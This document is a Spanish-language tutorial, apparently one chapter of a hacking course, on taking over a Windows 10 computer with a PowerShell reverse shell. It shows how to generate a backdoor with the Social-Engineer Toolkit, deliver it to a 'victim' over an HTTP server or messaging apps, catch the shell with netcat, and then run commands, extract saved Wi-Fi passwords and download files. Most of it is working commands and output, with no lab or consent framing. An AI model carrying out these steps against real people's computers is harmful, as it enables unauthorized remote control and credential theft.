# 35. Hackeando Windows 10 (Obteniendo una reverse shell con Powershell)

Vamos a ver cómo obtener un acceso remoto a una computadora Windows por medio de una *reverse shell*, por medio de un archivo `.ps` (extensión de
Powershell). La víctima lo ejecuta y nos da un acceso remoto a la computadora víctima para poder ejecutar comandos arbitrarios y más.

## Social-Engineer Toolkit

Primero, tenemos que tener **Social-Engineer Toolkit** descargado.

Es una aplicación/herramienta que por defecto ya viene instalado en Kali Linux.

## Uso

### Configurando la reverse shell

Hacemos:

```bash
sudo setoolkit
```

Y debería iniciarse la herramienta.

>Si no lo tenemos instalado, nos vamos al link de [GitHub](https://github.com/trustedsec/social-engineer-toolkit), clonamos el reporitorio y seguimos los comandos de instalación

Nos vamos a la opción `9`, para hacer ataques de *Powershell*:

```plaintext
Select from the menu:

1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
8) Wireless Access Point Attack Vector
9) QRCode Generator Attack Vector
10) Powershell Attack Vectors
11) Third Party Modules

99) Return back to the main menu.

set> 9
```

Y vamos a elegir la opción `2` que es para hacer una **reverse shell**:

>Una *reverse shell* significa que la víctima se va a conectar a nosotros. Vamos a tener un *listener* en el cual vamos a estar a la
>escucha de una conexión que la víctima realice hacia nuestra computadora. Osea, la víctima se va a conectar a la computadora del
>atacante y nos va a dar una acceso a la terminal del equipo víctima y vamos a poder ejecutar comandos y controlar el sistema a nuestro gusto.

Y tenemos que poner la IP de nuestra máquina atacante. Para saber cual es, en otra pestaña, hacemos un:

```bash
ifconfig
```

La copiamos y pegamos:

```plaintext
Select from the menu:

1) Powershell Alphanumeric Shellcode Injector
2) Powershell Reverse Shell
3) Powershell Bind Shell
4) Powershell Dump SAM Database

99) Return to Main Menu.

set:powershell>2
Enter the IPAddress or DNS name for the reverse host: <own-ip>
```

Ahora, tenemos que poner el puerto por el cual estaremos a la escucha de una conexión. En este caso será:

```plaintext
set:powershell>Enter the port for listener [443]:4444
[*] Rewriting the powershell reverse shell with options
[*] Exporting the powershell stuff to /root/.set/reports/powershell
```

Se estará exportando el archivo que vendría siendo el **troyano/backdoor** que le vamos a dar a la víctima para que lo ejecute y nos de
un acceso remoto a su computadora.

En otra pestaña, hacemos:

```bash
sudo su
cd /root/.set/reports/powershell
ls
```

El archivo de la *reverse shell* está localizado en este directorio, lo veremos como `powershell.reverse.txt`.
No necesariamente nos va a salir en este directorio, puede ser en cualquier otro directorio, nos lo dirá al ingresar el puerto.

Ahora, cambiamos la extensión del archivo de `.txt` a `.ps1` (extensión de Powershell):

```bash
cp powershell.reverse.txt Backdoor.ps1
ls
file Backdoor.ps1
```

Ahora, veremos los 2 archivos: `Backdoor.ps1` y `powershell.reverse.txt`.

Una vez tenemos el *backdoor*, vamos a abrir un servidor en el cual vamos a pasar el archivo `Backdoor.ps1`  a la computadora víctima para que lo ejecute.

Pero podemos pasar este *backdoor* por donde queramos, Whatsapp, Telegram, Google Drive, etc.

En este caso, lo hacemos con Python:

```bash
sudo python -m SimpleHTTPServer
```

Y vamos a pasar el archivo por medio de un servidor que abrimos en el puerto `8000` con nuestra dirección IP de atacante (la verificamos con
`ifconfig`):

```plaintext
http://<own-ip>:8000
```

Y en el navegador de la víctima ponemos está dirección. Luego, le damos clic a `Backdoor.ps1`, lo guardamos, nos vamos a la computadora atacante
y ponemos un *listener*.

Nos dice si queremos iniciar un *listener*, le ponemos que *no* (y escribimos 2 veces `99` para salir de la herramienta):

```plaintext
set> Do you want to start a listener [yes/no]: no

set> 99

set> 99
```

### Ejecutando el backdoor

Ahora, vamos a poner un *listener* manual con **NetCat**, porque el de **Social-Engineer Toolkit** no es muy bueno y una vez que la víctima hace
clic en el archivo, en el *troyano/backdoor* no se inicia la sesión y demás cosas:

```bash
nc -lvp 4444
```

* `4444` es el puerto que nosotros pusimos al crear el *backdoor*. Pusimos la dirección IP de nuestra máquina y un puerto

Una vez que ya tenemos el *listener* en la computadora atacante, vamos a la computadora víctima, le damos **clic derecho** al *backdoor* que
creamos y le damos en **Ejecutar con PowerShell**.

Nos debería devolver `True` y darnos la sesión en la cual la víctima se conectó a nosotros, y ya tenemos una sesión *PowerShell* (en este caso,
una **cmd**):

```plaintext
<victim-ip>: inverse host lookup failed: Unknown host
connect to [<own-ip>] from (UNKNOWN) [<victim-ip>] 56282
Microsoft Windows [Versi?n 10.0.[*any].[*any]]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\<victim-user>\Desktop>
```

### Ejecutando comandos arbitrarios en la computadora víctima

En este caso, vamos a ejecutar:

```powershell
C:\Users\<victim-user>\Desktop>start cmd
```

Nos debería abrir una **cmd** en la computadora víctima.

Vamos a abrir **Google Chrome** (si está instalado):

```powershell
C:\Users\<victim-user>\Desktop>start chrome
```

Vamos a abrir **Bloc de notas**:

```powershell
C:\Users\<victim-user>\Desktop>start notepad
```

Vamos a guardar un mensaje en un archivo de texto, en el directorio `Desktop`:

```powershell
C:\Users\<victim-user>\Desktop>echo "Hola Mundo" > ArchivoDeTexto.txt
```

Podemos ejecutar cualquier tipo de comando, hacer cualquier cosa en la computadora víctima, porque ya tenemos control total.
Podemos obtener las contraseñas de la computadora víctima, específicamente las de Wi-Fi:

En la **cmd**, ponemos:

```powershell
C:\Users\<victim-user>\Desktop>netsh wlan show profiles
```

Veremos todas las redes Wi-Fi que estén en la computadora víctima:

```plaintext
Perfiles en la interfaz  Wi-Fi:

Perfiles de directiva de grupo (solo lectura)
---------------------------------------------
    <Ninguno>

Perfiles de usuario
-------------------
    Perfil de todos los usuarios     : <wifi-network>
    ...
```

Ahora, obtenemos la contraseña de alguna red:

```powershell
C:\Users\<victim-user>\Desktop>netsh wlan show profiles name="<wifi-network>" key=clear
```

* `name="<wifi-network>"`: Indicamos el nombre de la red Wi-Fi que queremos obtener su contraseña
* `key=clear`: Para que nos muestre la contraseña

En **Configuración de seguridad** , nos dice toda la autenticación, el cifrado que utiliza la red y el **Contenido de la clave** (contraseña):

```plaintext
Perfil <name-wifi> en la interfaz Wi-Fi:
=======================================================================

Aplicado: Perfil de todos los usuarios

Información del perfil
----------------------
    Versión                : 1
    Tipo                   : LAN inalámbrica
    Nombre                 : <name-wifi>
    Opciones de control    :
        Modo de conexión : conectar automáticamente
        Difusión de red  : conectarse solo si esta red está difundiendo
        Cambio automático: no cambiar a otras redes
        Selección aleatoria de dirección MAC: deshabilitada

Configuración de conectividad
-----------------------------
    Número de SSID        : 1
    Nombre de SSID       : <name-ssid>
    Tipo de red           : Infraestructura
    Tipo de radio          : [ Cualquier tipo de radio ]
    Extensión de proveedor         : no está presente

Configuración de seguridad
--------------------------
    Autenticación                  : WPA2-Personal
    Cifrado                        : GCMP
    Autenticación                  : WPA2-Personal
    Cifrado                        : CCMP
    Clave de seguridad                         : Presente
    Contenido de la clave  : <password>

Configuración de costos
-------------
    Costo                   : Sin restricciones
    Congestionado              : no
    A punto de alcanzar el límite de datos: no
    Límite de datos superado        : no
    Itinerancia                : no
    Origen del coste            : predeterminado
```

Podemos abrir una sesión de *PowerShell* y descargar archivos de Internet:

```powershell
C:\Users\<victim-user>\Desktop>powershell
Windows PowerShell
Copyright (c) Microsoft Corporation. Todos los derechos reservados.

Prueba la nueva tecnolog?a PowerShell multiplataforma https://aka.ms/pscore6

C:\Users\<victim-user>\Desktop>wget "<link>"
```